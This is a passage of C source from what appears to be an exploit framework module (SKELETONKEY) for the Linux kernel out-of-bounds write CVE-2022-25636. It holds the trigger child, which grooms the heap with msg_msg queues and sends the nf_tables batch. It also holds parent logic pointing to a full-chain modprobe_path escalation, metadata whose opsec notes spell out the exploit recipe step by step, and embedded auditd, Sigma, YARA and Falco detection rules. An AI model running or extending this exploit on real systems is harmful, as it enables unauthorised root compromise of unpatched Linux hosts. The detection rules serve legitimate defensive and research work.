        setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof rcvbuf);

        int qids[SPRAY_QUEUES_GROOM];
        for (int i = 0; i < SPRAY_QUEUES_GROOM; i++) qids[i] = -1;
        int groomed = spray_msg_msg_groom(qids, SPRAY_QUEUES_GROOM);
        if (!ctx->json) {
            fprintf(stderr, "[*] nft_fwd_dup: pre-groom seeded %d queues\n",
                    groomed);
        }

        uint8_t *batch = calloc(1, 32 * 1024);
        if (!batch) { drain_msg_msg(qids, SPRAY_QUEUES_GROOM);
                      close(sock); _exit(23); }

        long before = slab_active("kmalloc-512");
        if (before < 0) before = slab_active("kmalloc-cg-512");

        uint32_t seq = (uint32_t)time(NULL);
        size_t blen = build_trigger_batch(batch, &seq);
        if (!ctx->json) {
            fprintf(stderr, "[*] nft_fwd_dup: sending trigger batch "
                            "(%zu bytes, %d preceding immediates)\n",
                            blen, N_PRECEDING_IMMEDIATES);
        }
        if (nft_send_batch(sock, batch, blen) < 0) {
            fprintf(stderr, "[-] nft_fwd_dup: trigger batch send failed\n");
            drain_msg_msg(qids, SPRAY_QUEUES_GROOM);
            free(batch); close(sock); _exit(24);
        }

        /* Let the kernel run install + commit. */
        usleep(50 * 1000);

        long after = slab_active("kmalloc-512");
        if (after < 0) after = slab_active("kmalloc-cg-512");

        /* Breadcrumb for triage. */
        FILE *log = fopen("/tmp/skeletonkey-nft_fwd_dup.log", "w");
        if (log) {
            fprintf(log,
                "nft_fwd_dup trigger child: queues=%d slab-512 pre=%ld post=%ld\n",
                groomed, before, after);
            fclose(log);
        }

        if (!ctx->json) {
            fprintf(stderr, "[i] nft_fwd_dup: kmalloc-512 active %ld → %ld\n",
                    before, after);
        }

        drain_msg_msg(qids, SPRAY_QUEUES_GROOM);
        free(batch);
        close(sock);
        _exit(100);
    }

    /* PARENT: wait. */
    int status;
    waitpid(child, &status, 0);

    if (!WIFEXITED(status)) {
        if (!ctx->json) {
            fprintf(stderr, "[!] nft_fwd_dup: child died by signal %d — bug "
                            "likely fired (KASAN/oops can manifest as signal)\n",
                    WTERMSIG(status));
        }
        return SKELETONKEY_EXPLOIT_FAIL;
    }

    int rc = WEXITSTATUS(status);
    if (rc == 100) {
        if (!ctx->json) {
            fprintf(stderr, "[!] nft_fwd_dup: trigger fired; OOB write into\n"
                            "    flow->rule->action.entries[] landed in\n"
                            "    adjacent kmalloc-512 chunk. Full kernel R/W\n"
                            "    chain NOT executed (Option B scope).\n"
                            "[i] nft_fwd_dup: to complete: pass --full-chain so\n"
                            "    the kaddr-tagged forged-entry spray reaches\n"
                            "    the shared modprobe_path finisher.\n");
        }
        return SKELETONKEY_EXPLOIT_FAIL;
    }
    if (rc >= 20 && rc <= 24) {
        if (!ctx->json) {
            fprintf(stderr, "[-] nft_fwd_dup: trigger setup failed "
                            "(child rc=%d)\n", rc);
        }
        return SKELETONKEY_EXPLOIT_FAIL;
    }
    if (!ctx->json) {
        fprintf(stderr, "[-] nft_fwd_dup: unexpected child rc=%d\n", rc);
    }
    return SKELETONKEY_EXPLOIT_FAIL;
}

/* ------------------------------------------------------------------
 * Cleanup — drain leftover sysv queues and unlink the breadcrumb.
 * ------------------------------------------------------------------ */

static skeletonkey_result_t nft_fwd_dup_cleanup(const struct skeletonkey_ctx *ctx)
{
    if (!ctx->json) {
        fprintf(stderr, "[*] nft_fwd_dup: cleaning up sysv queues + log\n");
    }
    /* Best-effort drain of any leftover msg queues with IPC_PRIVATE
     * key owned by us. SysV doesn't enumerate by key, but msgctl
     * IPC_STAT walks /proc/sysvipc/msg to find them. */
    FILE *f = fopen("/proc/sysvipc/msg", "r");
    if (f) {
        char line[512];
        /* header line first */
        if (fgets(line, sizeof line, f)) {
            int msqid;
            unsigned long key, uid;
            while (fgets(line, sizeof line, f)) {
                if (sscanf(line, "%lu %d %*o %*u %*u %*u %*u %lu",
                           &key, &msqid, &uid) >= 3) {
                    if (uid == (unsigned long)getuid())
                        msgctl(msqid, IPC_RMID, NULL);
                }
            }
        }
        fclose(f);
    }
    if (unlink("/tmp/skeletonkey-nft_fwd_dup.log") < 0 && errno != ENOENT) {
        /* harmless */
    }
    return SKELETONKEY_OK;
}

#else  /* !__linux__ */

/* Non-Linux dev builds: nf_tables / NETLINK_NETFILTER / SysV msg_msg
 * groom — all Linux-only kernel surface. Stub out so the module still
 * registers and the top-level `make` completes on macOS/BSD dev boxes. */
static skeletonkey_result_t nft_fwd_dup_detect(const struct skeletonkey_ctx *ctx)
{
    if (!ctx->json)
        fprintf(stderr, "[i] nft_fwd_dup: Linux-only module "
                "(nf_tables HW-offload OOB) — not applicable here\n");
    return SKELETONKEY_PRECOND_FAIL;
}
static skeletonkey_result_t nft_fwd_dup_exploit(const struct skeletonkey_ctx *ctx)
{
    (void)ctx;
    fprintf(stderr, "[-] nft_fwd_dup: Linux-only module — cannot run here\n");
    return SKELETONKEY_PRECOND_FAIL;
}
static skeletonkey_result_t nft_fwd_dup_cleanup(const struct skeletonkey_ctx *ctx)
{
    (void)ctx;
    return SKELETONKEY_OK;
}

#endif /* __linux__ */

/* ------------------------------------------------------------------
 * Embedded detection rules.
 * ------------------------------------------------------------------ */

static const char nft_fwd_dup_auditd[] =
    "# nft_fwd_dup OOB write (CVE-2022-25636) — auditd detection\n"
    "# Flag the canonical exploit shape: unprivileged userns followed\n"
    "# by NEWTABLE/NEWCHAIN(NFT_CHAIN_HW_OFFLOAD)/NEWRULE traffic on\n"
    "# AF_NETLINK NETLINK_NETFILTER, plus the msg_msg cross-cache spray.\n"
    "-a always,exit -F arch=b64 -S unshare -k skeletonkey-nft-fwd-dup-userns\n"
    "-a always,exit -F arch=b64 -S socket -F a0=16 -F a2=12 -k skeletonkey-nft-fwd-dup-netlink\n"
    "-a always,exit -F arch=b64 -S sendmsg -k skeletonkey-nft-fwd-dup-batch\n"
    "-a always,exit -F arch=b64 -S msgsnd -k skeletonkey-nft-fwd-dup-spray\n"
    "# Post-exploit hallmarks (modprobe_path overwrite path):\n"
    "-w /tmp/skeletonkey-mp- -p w -k skeletonkey-nft-fwd-dup-modprobe\n";

static const char nft_fwd_dup_sigma[] =
    "title: Possible CVE-2022-25636 nft_fwd_dup_netdev_offload OOB exploitation\n"
    "id: 3c1f9b27-skeletonkey-nft-fwd-dup\n"
    "status: experimental\n"
    "description: |\n"
    "  Detects unprivileged user namespace creation followed by\n"
    "  netfilter nf_tables NEWCHAIN with the NFT_CHAIN_HW_OFFLOAD\n"
    "  flag and an unusually long expression list (immediates >> fwd).\n"
    "  False positives: containerized firewall management with hw-offload.\n"
    "logsource: {product: linux, service: auditd}\n"
    "detection:\n"
    "  userns_clone:\n"
    "    type: 'SYSCALL'\n"
    "    syscall: 'unshare'\n"
    "    a0: 0x10000000\n"
    "  msgsnd:\n"
    "    type: 'SYSCALL'\n"
    "    syscall: 'msgsnd'\n"
    "  condition: userns_clone and msgsnd\n"
    "level: high\n"
    "tags: [attack.privilege_escalation, attack.t1068, cve.2022.25636]\n";

static const char nft_fwd_dup_yara[] =
    "rule nft_fwd_dup_cve_2022_25636 : cve_2022_25636 kernel_oob_write\n"
    "{\n"
    "    meta:\n"
    "        cve         = \"CVE-2022-25636\"\n"
    "        description = \"nft_fwd/dup actions OOB kmalloc-512 spray tag and log\"\n"
    "        author      = \"SKELETONKEY\"\n"
    "    strings:\n"
    "        $tag = \"SKELETONKEY_FWD\" ascii\n"
    "        $log = \"/tmp/skeletonkey-nft_fwd_dup.log\" ascii\n"
    "    condition:\n"
    "        any of them\n"
    "}\n";

static const char nft_fwd_dup_falco[] =
    "- rule: nft_fwd_dup OOB-write batch by non-root\n"
    "  desc: |\n"
    "    Non-root nfnetlink batch creating a netdev table with\n"
    "    HW_OFFLOAD chain containing >15 immediate(NF_ACCEPT)\n"
    "    expressions + 1 fwd. The offload walk overruns the action\n"
    "    entries[] array. CVE-2022-25636.\n"
    "  condition: >\n"
    "    evt.type = sendmsg and fd.sockfamily = AF_NETLINK and\n"
    "    not user.uid = 0\n"
    "  output: >\n"
    "    nfnetlink HW_OFFLOAD batch from non-root\n"
    "    (user=%user.name pid=%proc.pid)\n"
    "  priority: HIGH\n"
    "  tags: [network, mitre_privilege_escalation, T1068, cve.2022.25636]\n";

const struct skeletonkey_module nft_fwd_dup_module = {
    .name           = "nft_fwd_dup",
    .cve            = "CVE-2022-25636",
    .summary        = "nft_fwd_dup_netdev_offload heap OOB write (Aaron Adams)",
    .family         = "nf_tables",
    .kernel_range   = "5.4 ≤ K < 5.17; backports: 5.4.181 / 5.10.102 / "
                      "5.15.25 / 5.16.11",
    .detect         = nft_fwd_dup_detect,
    .exploit        = nft_fwd_dup_exploit,
    .mitigate       = NULL,    /* mitigation: upgrade kernel OR disable user_ns */
    .cleanup        = nft_fwd_dup_cleanup,
    .detect_auditd  = nft_fwd_dup_auditd,
    .detect_sigma   = nft_fwd_dup_sigma,
    .detect_yara    = nft_fwd_dup_yara,
    .detect_falco   = nft_fwd_dup_falco,
    .opsec_notes    = "unshare(CLONE_NEWUSER|CLONE_NEWNET) + nfnetlink batch (NEWTABLE netdev + NEWCHAIN HW_OFFLOAD + NEWRULE with 16 immediate(NF_ACCEPT) + 1 fwd). Offload hook walks the rule advertising num_actions+=16 but allocates only the original-actions size -> OOB write at entries[16] into adjacent kmalloc-512. msg_msg groom tagged 'SKELETONKEY_FWD'. Writes /tmp/skeletonkey-nft_fwd_dup.log. Audit-visible via unshare + socket(NETLINK_NETFILTER) + sendmsg + ioctl(SIOCGIFFLAGS/SIOCSIFFLAGS loopback) + msgsnd. Dmesg: KASAN or silent. Cleanup callback drains IPC queues and unlinks log.",
    .arch_support   = "x86_64+unverified-arm64",
};

void skeletonkey_register_nft_fwd_dup(void)
{
    skeletonkey_register(&nft_fwd_dup_module);
}
